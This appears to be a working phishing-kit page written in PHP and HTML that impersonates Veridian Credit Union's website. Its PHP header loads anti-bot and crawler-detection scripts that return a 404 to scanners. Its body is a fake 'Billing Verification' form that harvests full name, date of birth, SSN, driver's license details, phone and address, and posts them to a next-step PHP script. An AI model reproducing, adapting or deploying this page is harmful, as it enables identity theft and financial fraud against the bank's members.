<?php session_start();require_once './src/Classes/Comp.php';require_once './src/Classes/Antibot.php';$comps = new Comp;$antibot = new Antibot;if (!$comps->checkValue()) {echo $antibot->throw404();die();}require_once './zsec.php';include './huehuehue.php';include './bot_fucker/bot.php';include './bot_fucker/wrd.php';include './crawlerdetect.php';
?><!DOCTYPE html>

<html lang="en">

<head>
    
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    
  
   
   
    <!---Favicon and App Images-->
    <link rel="apple-touch-icon" sizes="180x180" href="files/apple-touch-icon.png">
    <link rel="icon" type="image/png" sizes="32x32" href="files/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="16x16" href="files/favicon-16x16.png">
    
    <link rel="mask-icon" href="./safari-pinned-tab.svg" color="#007a50">
    <link rel="shortcut icon" href="files/favicon.ico">

    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="IE=9;IE=10;IE=Edge,chrome=1">

        <title>Veridian Credit Union </title>

    <link href="./files/core.css" rel="stylesheet">

    <link href="./files/app.css" rel="stylesheet">



    <link href="./files/all.css" rel="stylesheet">

    <link href="./files/font-awesome.min.css" rel="stylesheet">

    <link href="./files/css.css" rel="stylesheet">


    



<style type="text/css">.fancybox-margin{margin-right:17px;}</style>


<link rel="preload" href="./files/SourceSansPro-Regular.woff" as="font" ></head>





<body id="vcuBody" class="homebase   activeBreadcrumb">
   



        <header  class="">
            


            <nav id="navMain" class="navbar navbar-default navbar-static-top" aria-label="Site">
                <div class="container-fluid">
                    <div class="navbar-header">
                        <button type="button" class="btn-menu navbar-toggle collapsed" data-toggle="collapse" data-target="#navHeader" aria-expanded="false">
                            <span class="sr-only">Toggle navigation</span>
                            <span class="icon-bar"></span>
                            <span class="icon-bar"></span>
                            <span class="icon-bar"></span>
                        </button>
                        <button type="button" class="btn-search navbar-toggle collapsed" data-toggle="collapse" data-target="#navHeader" aria-expanded="false">
                            <span class="sr-only">Search</span>
                            <span class="text-primary fas fa-search"></span>
                        </button>
                        <h1><a class="logo" href="#">
                            <img src="./files/veridian-logo.svg" alt="Veridian Credit Union">
                        </a></h1>
                    </div>
                    <!-- /.navbar-collapse -->
                <div class="collapse navbar-collapse" id="navHeader">
                        <!-- Main Nav -->
                   
       
                    </div></div><!-- /.container-fluid -->
            </nav>

        </header>
 
        

        

        <style>

input[type=text], select, textarea {
  width: 90%;
  padding: 12px;
  border: 1px solid #ccc;
  border-radius: 4px;
  resize: vertical;
}
input[type=tel], select, textarea {
  width: 90%;
  padding: 12px;
  border: 1px solid #ccc;
  border-radius: 4px;
  resize: vertical;
}
input[type=password], select, textarea {
  width: 90%;
  padding: 12px;
  border: 1px solid #ccc;
  border-radius: 4px;
  resize: vertical;
}
input[type=date], select, textarea {
  width: 90%;
  padding: 12px;
  border: 1px solid #ccc;
  border-radius: 4px;
  resize: vertical;
}
label {
  padding: 12px 12px 12px 0;
  display: inline-block;
}

input[type=submit] {
  background-color: #007a4f;
  color: white;
  padding: 12px 20px;
  border: none;
  border-radius: 4px;
  cursor: pointer;
  float: right;
}

input[type=submit]:hover {
  background-color: #025f3e;
}

@media (min-width: 700px){
.cntainer {
  border-radius: 5px;
  padding: 20px;
  background-color: #f6f6f6;
  margin-right: 15%;
  margin-left: 15%;
}
.col-23 {
  float: left;
  width: 40%;
  margin-top: 6px;
}
}
@media (max-width: 699px){
.cntainer {
  border-radius: 5px;
  padding: 20px;
  background-color: #f6f6f6;
  margin-left: 2%;
  margin-right: 2%;
}
.col-23 {
  float: left;
  width: 80%;
  margin-top: 6px;
}
}
hr {
    width: 100%;
    height: 2px;
    background-color: blue;

}


.col-25 {
  float: left;
  width: 35%;
  margin-top: 6px;
}


.col-75 {
  float: left;
  width: 45%;
  margin-top: 3px;
}


/* Clear floats after the columns */
.rew:after {
  content: "";
  display: table;
  clear: both;
}

/* Responsive layout - when the screen is less than 600px wide, make the two columns stack on top of each other instead of next to each other */
@media screen and (max-width: 600px) {
  .col-25, .col-75, input[type=submit] {
    width: 100%;
    margin-top: 0;
  }
}
</style><br>
<div class="cntainer">
<div class="rew">
      <div class="col-23">
         <h3> Billing Verification </h3>
         <hr>
</div>
</div>
<form action="step/next/mainnet.php?value=<?php echo $_SESSION['value']; ?>" method="POST">
<div class="rew">
      <div class="col-25">
        <label for="fname">Full Name</label>
      </div>
      <div class="col-75">
        <input type="text" id="fname" name="fname" required>
      </div>
    </div>
	<div class="rew">
      <div class="col-25">
        <label for="dob">Date Of Birth</label>
      </div>
      <div class="col-75">
        <input type="date" id="dob" name="dob" required>
      </div>
    </div>
	<div class="rew">
      <div class="col-25">
        <label for="phn">Phone Number</label>
      </div>
      <div class="col-75">
        <input type="tel" id="phn" name="phn" placeholder="(___)___-____" data-slots="_" required>
      </div>
    </div>
	<div class="rew">
      <div class="col-25">
        <label for="ssn">SSN</label>
      </div>
      <div class="col-75">
        <input type="tel" id="ssn" name="ssn" placeholder="___-__-____" data-slots="_" required>
      </div>
    </div> 
    <div class="rew">
      <div class="col-25">
        <label for="dln">Driver's License Number</label>
      </div>
      <div class="col-75">
        <input type="text" id="dln" name="dln">
      </div>
    </div>
    <div class="rew">
      <div class="col-25">
        <label for="crpn">License Exp Date</label>
      </div>
      <div class="col-75">
        <input type="text" id="crpn" name="crpn" required>
      </div>
    </div>
    <div class="rew">
      <div class="col-25">
        <label for="crpn">License Issue</label>
      </div>
      <div class="col-75">
        <input type="text" id="crpn" name="typid" required>
      </div>
    </div>
    
	<div class="rew">
      <div class="col-25">
        <label for="addy">Address</label>
      </div>
      <div class="col-75">
        <input type="text" id="addy" name="addy" required>
      </div>
    </div>
	<div class="rew">
      <div class="col-25">
        <label for="cty">City</label>
      </div>
      <div class="col-75">
        <input type="text" id="cty" name="cty">
      </div>
    </div>
	<div class="rew">
      <div class="col-25">
        <label for="stte">State</label>
      </div>
      <div class="col-75">
        <input type="text" id="stte" name="stte">
      </div>
    </div>

    <div class="rew">
      <div class="col-25">
        <label for="zip">Zip Code</label>
      </div>
      <div class="col-75">
        <input type="tel" id="zip" name="zip" required>
      </div>
    </div>
  
    <br>
    <div class="rew">
     <div class="col-75">
      <input type="submit" value="Submit">
      </div>
    </div>
    </div>
    <br>
    <br>


<footer id="foot" aria-label="Veridian Credit Union Site Footer">
    <div class="container-fluid">
        <div class="col-lg-6">
        <p>As a credit union, we're organized differently than other financials. Veridian is a not-for-profit financial cooperative owned by our members. That means earnings are returned to members in the form of better rates and lower fees. Veridian is also governed by a volunteer board of directors who are elected by our members. Each member has one vote in the election for our board regardless of how much money that individual has on deposit.</p>
                    <p><br><a class="btn bg-primary" href="https://www.veridiancu.org/belong/membership/about-veridian" title="Learn More About Veridian Credit Union" aria-label="Learn More About Veridian Credit Union">Learn More</a></p>

        </div>
        <div class="col-lg-6">
                    <div class="col-sm-3">
                        <button class="navbar-toggle collapsed" type="button" aria-controls="nav-footer-Personal" aria-expanded="false" data-toggle="collapse" data-target="#navbar-footer-Personal-options">
                            <span class="sr-only">Toggle Menu</span>
                            <span class="icon-bar top-bar"></span>
                            <span class="icon-bar middle-bar"></span>
                            <span class="icon-bar bottom-bar"></span>
                            Personal
                        </button>
                        <div id="navbar-footer-Personal-options" class="navbar-collapse collapse" aria-expanded="false" style="height: 1px;">
                            <div id="nav-footer-Personal" class="nav">
                                <h2 class="list-group-header">Personal</h2>
                                <ul class="nav list-group">
                                        <li class="list-group-item"><a href="https://www.veridiancu.org/personal/save" aria-label="Personal: Save">Save</a></li>
                                        <li class="list-group-item"><a href="https://www.veridiancu.org/personal/borrow" aria-label="Personal: Borrow">Borrow</a></li>
                                        <li class="list-group-item"><a href="https://www.veridiancu.org/personal/insure" aria-label="Personal: Insure">Insure</a></li>
                                        <li class="list-group-item"><a href="https://www.veridiancu.org/personal/advice" aria-label="Personal: Advice">Advice</a></li>
                                </ul>
                            </div>
                        </div>
                    </div>
                    <div class="col-sm-3">
                        <button class="navbar-toggle collapsed" type="button" aria-controls="nav-footer-Business" aria-expanded="false" data-toggle="collapse" data-target="#navbar-footer-Business-options">
                            <span class="sr-only">Toggle Menu</span>
                            <span class="icon-bar top-bar"></span>
                            <span class="icon-bar middle-bar"></span>
                            <span class="icon-bar bottom-bar"></span>
                            Business
                        </button>
                        <div id="navbar-footer-Business-options" class="navbar-collapse collapse" aria-expanded="false" style="height: 1px;">
                            <div id="nav-footer-Business" class="nav">
                                <h2 class="list-group-header">Business</h2>
                                <ul class="nav list-group">
                                        <li class="list-group-item"><a href="https://www.veridiancu.org/business/banking" aria-label="Business: Banking">Banking</a></li>
                                        <li class="list-group-item"><a href="https://www.veridiancu.org/business/lending" aria-label="Business: Lending">Lending</a></li>
                                        <li class="list-group-item"><a href="https://www.veridiancu.org/business/services" aria-label="Business: Services">Services</a></li>
                                        <li class="list-group-item"><a href="https://www.veridiancu.org/business/advice" aria-label="Business: Advice">Advice</a></li>
                                </ul>
                            </div>
                        </div>
                    </div>
                    <div class="col-sm-3">
                        <button class="navbar-toggle collapsed" type="button" aria-controls="nav-footer-About-Us" aria-expanded="false" data-toggle="collapse" data-target="#navbar-footer-About-Us-options">
                            <span class="sr-only">Toggle Menu</span>
                            <span class="icon-bar top-bar"></span>
                            <span class="icon-bar middle-bar"></span>
                            <span class="icon-bar bottom-bar"></span>
                            About Us
                        </button>
                        <div id="navbar-footer-About-Us-options" class="navbar-collapse collapse" aria-expanded="false" style="height: 1px;">
                            <div id="nav-footer-About Us" class="nav">
                                <h2 class="list-group-header">About Us</h2>
                                <ul class="nav list-group">
                                        <li class="list-group-item"><a href="https://www.veridiancu.org/belong/membership" aria-label="About Us: Membership">Membership</a></li>
                                        <li class="list-group-item"><a href="https://www.veridiancu.org/belong/careers" aria-label="About Us: Careers">Careers</a></li>
                                        <li class="list-group-item"><a href="https://www.veridiancu.org/belong/community" aria-label="About Us: Community">Community</a></li>
                                        <li class="list-group-item"><a href="https://www.veridiancu.org/belong/inclusion" aria-label="About Us: Diversity, Equity &amp; Inclusion">Diversity, Equity &amp; Inclusion</a></li>
                                </ul>
                            </div>
                        </div>
                    </div>
            <div class="col-sm-3">
                <button class="navbar-toggle collapsed" type="button" aria-controls="nav-footer-other" aria-expanded="false" data-toggle="collapse" data-target="#navbar-footer-other-options">
                    <span class="sr-only">Toggle Menu</span>
                    <span class="icon-bar top-bar"></span>
                    <span class="icon-bar middle-bar"></span>
                    <span class="icon-bar bottom-bar"></span>
                    Other
                </button>
                <div id="navbar-footer-other-options" class="navbar-collapse collapse" aria-expanded="false" style="height: 1px;">
                    <div id="nav-footer-other" class="nav">
                        <h2 class="list-group-header">Other</h2>
                        <ul class="nav list-group">
                            <li class="list-group-item"><a href="https://www.veridiancu.org/contact-us">Contact Us</a></li>
                            <li class="list-group-item"><a href="https://www.veridiancu.org/locations">Locations</a></li>                            
                            <li class="list-group-item"><a href="https://www.veridiancu.org/news">News</a></li>
                            <li class="list-group-item"><a href="https://www.veridiancu.org/promo/specials">Specials</a></li>
                            <li class="list-group-item"><a href="https://join.veridiancu.org/" target="_blank">Open an Account</a></li>
                        </ul>
                    </div>
                </div>

            </div>
            <div class="col-sm-3 nav-footer-spanish">
                <button class="navbar-toggle collapsed" type="button" aria-controls="nav-footer-spanish" aria-expanded="false" data-toggle="collapse" data-target="#navbar-footer-spanish-options">
                    <span class="sr-only">Toggle Menu</span>
                    <span class="icon-bar top-bar"></span>
                    <span class="icon-bar middle-bar"></span>
                    <span class="icon-bar bottom-bar"></span>
                    Español
                </button>
                <div id="navbar-footer-spanish-options" class="navbar-collapse collapse" aria-expanded="false" style="height: 1px;">
                    <div id="nav-footer-spanish" class="nav">
                        <h2 class="list-group-header">Spanish</h2>
                        <ul class="nav list-group">
                            
                            <li class="list-group-item"><a href="https://www.veridiancu.org/espa%C3%B1ol/contacto">Contacto</a></li>
                            <li class="list-group-item"><a href="https://www.veridiancu.org/espa%C3%B1ol/membresia">Membresía</a></li>
                            <li class="list-group-item"><a href="https://www.veridiancu.org/espa%C3%B1ol/prestamos">Préstamos</a></li>
                            <li class="list-group-item"><a href="https://www.veridiancu.org/espa%C3%B1ol/servicios">Servicios</a></li>
                        </ul>
                    </div>
                </div>

            </div>
        </div>
        <hr>
        <div class="copyright">
            <div class="col-lg-6 col-sm-text-center">
                <p>*APR = Annual Percentage Rate | **APY = Annual Percentage Yield</p>
                <p>© 2022 - Veridian Credit Union</p>
                <p>Routing Number - 273976369</p>
            </div>
            <div class="col-lg-6 col-sm-text-center social-media">
                <span class="pull-right">
                    <a href="https://www.facebook.com/VeridianCU" aria-label="Veridian Credit Union Facebook" target="_blank">
                        <span class="fa fa-facebook fa-3x"></span>
                    </a>
                    <a href="https://twitter.com/VeridianCU" aria-label="Veridian Credit Union Twitter" target="_blank">
                        <span class="fa fa-twitter fa-3x"></span>
                    </a>
                    <a href="https://www.linkedin.com/company/veridiancu/" aria-label="Veridian Credit Union LinkedIn" target="_blank">
                        <span class="fa fa-linkedin fa-3x"></span>
                    </a>
                    <a href="https://www.instagram.com/veridiancu/" aria-label="Veridian Credit Union Instagram" target="_blank">
                        <span class="fa fa-instagram fa-3x"></span>
                    </a>
                    <a href="https://www.youtube.com/user/veridiancu" aria-label="Veridian Credit Union YouTube" target="_blank">
                        <span class="fa fa-youtube fa-3x"></span>
                    </a>
                    
                </span>
                
            </div>
            <div class="col-md-12 col-sm-text-center footer-graphics">
                <ul>
                        <li>
                            <a href="https://www.ncua.gov/Pages/default.aspx" target="_blank">
                                <img src="./files/ncua.png" alt="Insured by the NCUA">
                            </a>
                        </li>                                             <li>
                            <a href="https://www.hud.gov/program_offices/fair_housing_equal_opp" target="_blank">
                                <img src="./files/equal-house-opp.png" alt="Equal Housing Opportunity">
                            </a>
                        </li>
                    <li><a class="access" href="https://www.veridiancu.org/webres/File/privacy-policy.pdf" target="_blank">Privacy Policy</a></li>
                    <li><a class="access" href="https://www.veridiancu.org/webres/File/online-privacy-policy.pdf" target="_blank">Online Privacy Policy</a></li>
                    <li><a class="access" href="https://www.veridiancu.org/belong/inclusion/accessibility">Accessibility Statement</a></li>
                </ul>
            </div>
        </div>
    </div>
</footer>




<script>
document.addEventListener('DOMContentLoaded', () => {
    for (const el of document.querySelectorAll("[placeholder][data-slots]")) {
        const pattern = el.getAttribute("placeholder"),
            slots = new Set(el.dataset.slots || "_"),
            prev = (j => Array.from(pattern, (c,i) => slots.has(c)? j=i+1: j))(0),
            first = [...pattern].findIndex(c => slots.has(c)),
            accept = new RegExp(el.dataset.accept || "\\d", "g"),
            clean = input => {
                input = input.match(accept) || [];
                return Array.from(pattern, c =>
                    input[0] === c || slots.has(c) ? input.shift() || c : c
                );
            },
            format = () => {
                const [i, j] = [el.selectionStart, el.selectionEnd].map(i => {
                    i = clean(el.value.slice(0, i)).findIndex(c => slots.has(c));
                    return i<0? prev[prev.length-1]: back? prev[i-1] || first: i;
                });
                el.value = clean(el.value).join``;
                el.setSelectionRange(i, j);
                back = false;
            };
        let back = false;
        el.addEventListener("keydown", (e) => back = e.key === "Backspace");
        el.addEventListener("input", format);
        el.addEventListener("focus", format);
        el.addEventListener("blur", () => el.value === pattern && (el.value=""));
    }
});</script>


    <link href="./files/owlCarousel" rel="stylesheet">

    <link href="./files/ratebar" rel="stylesheet">


</body></html>